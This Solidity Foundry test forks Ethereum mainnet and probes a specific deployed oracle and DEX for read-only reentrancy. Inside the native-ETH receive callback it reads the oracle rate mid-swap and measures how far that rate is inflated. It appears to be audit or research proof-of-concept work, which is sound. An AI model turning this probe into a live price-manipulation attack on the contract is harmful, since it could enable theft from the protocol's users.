// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "forge-std/Test.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface ISmartColOracleProbe {
    function dexOracleData()
        external
        view
        returns (address dexPool, bool quoteInToken0, address liquidity, uint256 multiplier, uint256 divisor);
    function getExchangeRateOperate() external view returns (uint256);
}

interface IDexProbe {
    struct Implementations {
        address shift;
        address admin;
        address colOperations;
        address debtOperations;
        address perfectOperationsAndSwapOut;
    }
    struct ConstantViews {
        uint256 dexId;
        address liquidity;
        address factory;
        Implementations implementations;
        address deployerContract;
        address token0;
        address token1;
        bytes32 supplyToken0Slot;
        bytes32 borrowToken0Slot;
        bytes32 supplyToken1Slot;
        bytes32 borrowToken1Slot;
        bytes32 exchangePriceToken0Slot;
        bytes32 exchangePriceToken1Slot;
        uint256 oracleMapping;
    }
    function constantsView() external view returns (ConstantViews memory);
    function swapInWithCallback(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external
        payable
        returns (uint256 amountOut);
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external
        payable
        returns (uint256 amountOut);
}

contract NativeSwapSmartColOracleProbe is Test {
    address internal constant ORACLE = 0x14288700Dc560a3F26a81FF10AB19C8b75846c2D;
    address internal constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    ISmartColOracleProbe internal oracle = ISmartColOracleProbe(ORACLE);
    IDexProbe internal dex;
    address internal liquidity;
    address internal token0;
    bool internal recording;
    uint256 internal rateInNativeCallback;
    uint256 internal nativeReceived;

    function setUp() public {
        vm.createSelectFork("https://ethereum-rpc.publicnode.com", 25_694_823);
        (address dexAddress, , address liquidityAddress, , ) = oracle.dexOracleData();
        dex = IDexProbe(dexAddress);
        liquidity = liquidityAddress;
        IDexProbe.ConstantViews memory c = dex.constantsView();
        token0 = c.token0;
        assertEq(c.token1, NATIVE, "probe requires native token as token1 output");
        assertEq(c.liquidity, liquidity, "oracle and DEX liquidity mismatch");
    }

    function test_nativeOutputCallbackSeesPreOracleUpdateRate() public {
        uint256[6] memory amounts = [
            uint256(1_000e6),
            uint256(5_000e6),
            uint256(10_000e6),
            uint256(25_000e6),
            uint256(50_000e6),
            uint256(100_000e6)
        ];

        uint256 successful;
        uint256 bestInflation;
        for (uint256 i; i < amounts.length; ++i) {
            uint256 snapshot = vm.snapshot();
            deal(token0, address(this), amounts[i]);

            try this.executeRoundTrip(amounts[i]) returns (
                uint256 normalRate,
                uint256 callbackRate,
                uint256 afterFirstSwapRate,
                uint256 finalRate,
                uint256 ethOut,
                uint256 token0Loss
            ) {
                ++successful;
                uint256 inflation = callbackRate > normalRate
                    ? ((callbackRate - normalRate) * 1e18) / normalRate
                    : 0;
                if (inflation > bestInflation) bestInflation = inflation;

                emit log_named_uint("amountIn token0 raw", amounts[i]);
                emit log_named_uint("normal SmartCol rate", normalRate);
                emit log_named_uint("callback SmartCol rate", callbackRate);
                emit log_named_uint("rate immediately after first swap", afterFirstSwapRate);
                emit log_named_uint("rate after reverse swap", finalRate);
                emit log_named_uint("callback inflation 1e18", inflation);
                emit log_named_uint("native received", ethOut);
                emit log_named_uint("round-trip token0 loss", token0Loss);
            } catch (bytes memory reason) {
                emit log_named_uint("reverted amountIn token0 raw", amounts[i]);
                emit log_named_bytes("revert data", reason);
            }
            assertTrue(vm.revertTo(snapshot), "snapshot restore failed");
        }

        assertGt(successful, 0, "no live swap size executed");
        emit log_named_uint("best callback inflation 1e18", bestInflation);
    }

    function executeRoundTrip(uint256 amountIn)
        external
        returns (
            uint256 normalRate,
            uint256 callbackRate,
            uint256 afterFirstSwapRate,
            uint256 finalRate,
            uint256 ethOut,
            uint256 token0Loss
        )
    {
        require(msg.sender == address(this), "self only");
        normalRate = oracle.getExchangeRateOperate();
        uint256 token0Before = IERC20(token0).balanceOf(address(this));

        recording = true;
        rateInNativeCallback = 0;
        nativeReceived = 0;
        ethOut = dex.swapInWithCallback(true, amountIn, 0, address(this));
        recording = false;

        callbackRate = rateInNativeCallback;
        assertGt(callbackRate, 0, "native callback not reached");
        assertEq(nativeReceived, ethOut, "native callback amount mismatch");
        afterFirstSwapRate = oracle.getExchangeRateOperate();

        dex.swapIn{ value: ethOut }(false, ethOut, 0, address(this));
        finalRate = oracle.getExchangeRateOperate();

        uint256 token0After = IERC20(token0).balanceOf(address(this));
        token0Loss = token0Before > token0After ? token0Before - token0After : 0;
    }

    function dexCallback(address token, uint256 amount) external {
        require(msg.sender == address(dex), "DEX only");
        require(token == token0, "unexpected callback token");
        IERC20(token).transfer(liquidity, amount);
    }

    receive() external payable {
        if (recording) {
            rateInNativeCallback = oracle.getExchangeRateOperate();
            nativeReceived += msg.value;
        }
    }
}
